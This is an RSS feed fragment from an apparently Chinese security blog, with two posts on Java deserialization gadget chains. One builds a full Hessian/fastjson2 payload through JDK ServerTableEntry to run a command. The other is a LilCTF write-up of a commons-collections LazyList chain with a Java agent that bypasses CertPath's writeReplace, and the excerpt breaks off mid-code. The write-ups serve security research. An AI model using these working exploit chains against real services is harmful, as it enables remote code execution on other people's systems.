      
      <content:encoded><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServerManagerImpl</span> <span class="variable">serverManager</span> <span class="operator">=</span> (ServerManagerImpl) unsafe.allocateInstance(ServerManagerImpl.class);</span><br><span class="line">      HashMap&lt;Integer, ServerTableEntry&gt; hashMap =<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">      <span class="type">ServerTableEntry</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span> (ServerTableEntry) unsafe.allocateInstance(ServerTableEntry.class);</span><br><span class="line">      hashMap.put(<span class="number">1</span>,serverTableEntry);</span><br><span class="line">      ReflectTools.setFieldValue(serverTableEntry,<span class="string">&quot;state&quot;</span> ,<span class="number">2</span>);</span><br><span class="line">      ReflectTools.setFieldValue(serverTableEntry, <span class="string">&quot;activateRetryCount&quot;</span>,<span class="number">0</span>);</span><br><span class="line">      ReflectTools.setFieldValue(serverTableEntry, <span class="string">&quot;debug&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">      ReflectTools.setFieldValue(serverTableEntry, <span class="string">&quot;activationCmd&quot;</span>, <span class="string">&quot;touch /tmp/success&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="type">Object</span> <span class="variable">process</span> <span class="operator">=</span> unsafe.allocateInstance(Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>));</span><br><span class="line">      ReflectTools.setFieldValue(process, <span class="string">&quot;hasExited&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">      ReflectTools.setFieldValue(serverTableEntry, <span class="string">&quot;process&quot;</span>, process);</span><br><span class="line">      ReflectTools.setFieldValue(serverManager, <span class="string">&quot;serverTable&quot;</span>, hashMap);</span><br><span class="line">      <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(serverManager);</span><br><span class="line">      <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">      ReflectTools.setFieldValue(bad, <span class="string">&quot;val&quot;</span>, objects);</span><br><span class="line">      <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream).writeObject(bad);</span><br></pre></td></tr></table></figure><p>但是我在序列化JSONArray的时候出现了一些问题</p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/20250821143016.png"></p><p>Exception in thread “main” java.io.NotSerializableException: com.sun.corba.se.impl.activation.ServerTableEntry</p><p>我该如何去解决它</p><p>发现他是hessian反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n1ght;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.corba.se.impl.activation.ServerManagerImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.corba.se.impl.activation.ServerTableEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XStringForFSB;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.sun.org.apache.xalan.internal.xsltc.compiler.Constants.CHARACTERS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ServerManagerImpl</span> <span class="variable">serverManager</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerManagerImpl.class);</span><br><span class="line">        HashMap&lt;Integer, ServerTableEntry&gt; hashMap =<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">ServerTableEntry</span> <span class="variable">serverTableEntry</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(ServerTableEntry.class);</span><br><span class="line">        hashMap.put(<span class="number">1</span>,serverTableEntry);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;state&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;activateRetryCount&quot;</span>,<span class="number">0</span>);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;debug&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;activationCmd&quot;</span>, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Object process = createWithObjectNoArgsConstructor(Class.forName(&quot;java.lang.UNIXProcess&quot;));</span></span><br><span class="line"><span class="comment">//        setFieldValue(process, &quot;hasExited&quot;, true);</span></span><br><span class="line"><span class="comment">//        setFieldValue(serverTableEntry, &quot;process&quot;, process);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        setFieldValue(serverManager, &quot;serverTable&quot;, hashMap);</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">process</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>));</span><br><span class="line">        setFieldValue(process, <span class="string">&quot;handle&quot;</span>, <span class="number">6</span>);</span><br><span class="line">        setFieldValue(serverTableEntry, <span class="string">&quot;process&quot;</span>, process);</span><br><span class="line">        setFieldValue(serverManager, <span class="string">&quot;serverTable&quot;</span>, hashMap);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;key&quot;</span>, serverManager);</span><br><span class="line">        <span class="type">XStringForFSB</span> <span class="variable">xStringForFSB</span> <span class="operator">=</span> createWithoutConstructor(XStringForFSB.class);</span><br><span class="line">        setFieldValue(xStringForFSB, <span class="string">&quot;m_strCache&quot;</span>, generateRandomString());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">conEntry1</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(Class.forName(<span class="string">&quot;java.util.concurrent.ConcurrentHashMap$MapEntry&quot;</span>));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">conEntry2</span> <span class="operator">=</span> createWithObjectNoArgsConstructor(Class.forName(<span class="string">&quot;java.util.concurrent.ConcurrentHashMap$MapEntry&quot;</span>));</span><br><span class="line">        setFieldValue(conEntry1, <span class="string">&quot;key&quot;</span>, xStringForFSB);</span><br><span class="line">        setFieldValue(conEntry1, <span class="string">&quot;val&quot;</span>, jsonObject);</span><br><span class="line">        setFieldValue(conEntry2, <span class="string">&quot;key&quot;</span>, jsonObject);</span><br><span class="line">        setFieldValue(conEntry2, <span class="string">&quot;val&quot;</span>, xStringForFSB);</span><br><span class="line">        <span class="type">ConcurrentHashMap</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;sizeCtl&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.concurrent.ConcurrentHashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.concurrent.ConcurrentHashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        setAccessible(nodeCons);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, conEntry1, conEntry1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, conEntry2, conEntry2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> ConcurrentHashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        table.set(s, tbl);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line"></span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        sf.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        out.setSerializerFactory(sf);</span><br><span class="line">        out.writeObject(s);</span><br><span class="line">        out.flush();</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(byteArrayInputStream).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> random.nextInt(<span class="number">20</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> random.nextInt(CHARACTERS.length());</span><br><span class="line">            <span class="type">char</span> <span class="variable">randomChar</span> <span class="operator">=</span> CHARACTERS.charAt(index);</span><br><span class="line">            sb.append(randomChar);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithObjectNoArgsConstructor</span><span class="params">(Class&lt;T&gt; clzToInstantiate)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">T</span> <span class="variable">resObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            resObject = createWithConstructor(clzToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException | InstantiationException | IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> resObject;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        setAccessible(objCons);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        setAccessible(sc);</span><br><span class="line">        <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(AccessibleObject member)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">versionStr</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">javaVersion</span> <span class="operator">=</span> Integer.parseInt(versionStr.split(<span class="string">&quot;\\.&quot;</span>)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// not possible to quiet runtime warnings anymore...</span></span><br><span class="line">            <span class="comment">// see https://bugs.openjdk.java.net/browse/JDK-8210522</span></span><br><span class="line">            <span class="comment">// to understand impact on Permit (i.e. it does not work</span></span><br><span class="line">            <span class="comment">// anymore with Java &gt;= 12)</span></span><br><span class="line">            member.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://www.n1ght.cn/tags/java/">java</category>
      
      
      <comments>https://www.n1ght.cn/2025/08/21/blackhat-JDD-hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jdk_fastjson%E9%93%BE/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Lilctf_blade_cc</title>
      <link>https://www.n1ght.cn/2025/08/21/blade_cc/</link>
      <guid>https://www.n1ght.cn/2025/08/21/blade_cc/</guid>
      <pubDate>Thu, 21 Aug 2025 06:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;这个题目的大部分链子存在博客里面：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.n1ght.cn/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-colle</description>
        
      
      
      
      <content:encoded><![CDATA[<p>这个题目的大部分链子存在博客里面：</p><p><a href="https://www.n1ght.cn/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/">https://www.n1ght.cn/2024/04/17/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Ecommons-collections-TransformedList%E8%A7%A6%E5%8F%91transform/</a></p><p>所用到的类java原生类和common-collections类<br>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/cc-20240820160731-h873z4i.jpg" alt="cc"><br>jdk版本是<br>jdk1.8.0_162<br>看到之前师傅总结的cc链子的图，我去使用CodeQL寻找了一下，发现除了Map，List也能触发。<br>我找了一个可以触发到transform的链子，剩下的作用如InvokerTransform触发二次反序列化没有写，这边使用ChainedTransformer做一个例子<br>调用链：<br>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701075448-0xanqgn.png" alt="image"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>eventListener触发CodeSigner的toString方法</p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701075455-4gcufyl.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701075500-c01lfjh.png" alt="image"><br>signerCertPath.getCertificates().get(0)<br>这一行代码<br>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701075506-dnq0n3g.png" alt="image"><br>调用了signerCertPath的get(0)<br>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701075517-ek9tv9l.png" alt="image"><br>也就是LazyList的get(0)，由于factory用的是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantFactory</span>(chainedTransformer)</span><br></pre></td></tr></table></figure><p>所以object就为chainedTransformer<br>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701075522-dfu6ybl.png" alt="image"><br>进入<br>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701075529-6b12yvl.png" alt="image"><br>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701075535-t9wbqm4.png" alt="image"><br>最后就进入了InvokerTransform的transform<br>​<img src="https://raw.githubusercontent.com/yezere/images/master/image/image-20250701075542-yzxwivw.png" alt="image"><br>由于CertPath重写了writeReplace导致序列化异常，我使用了agent将其hook掉</p><h2 id="agent-hook"><a href="#agent-hook" class="headerlink" title="agent hook"></a>agent hook</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n1ght;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;  </span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;  </span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;  </span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;  </span><br><span class="line"><span class="keyword">import</span> java.security.cert.CertPath;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoveReplaceTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;  </span><br><span class="line">        <span class="keyword">if</span>(className.equals(<span class="string">&quot;java/security/cert/CertPath&quot;</span>))&#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                System.out.println(<span class="literal">true</span>);  </span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;java.security.cert.CertPath&quot;</span>);  </span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);  </span><br><span class="line">                ctClass.removeMethod(writeReplace);  </span><br><span class="line">                ctClass.detach();  </span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();  </span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">                System.out.println(e);;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span>  classfileBuffer;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将agent加上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.web;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantFactory;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.list.LazyList;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.list.TransformedList;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.ListOrderedMap;  </span><br><span class="line"><span class="keyword">import</span> sun.misc.Unsafe;  </span><br><span class="line"><span class="keyword">import</span> 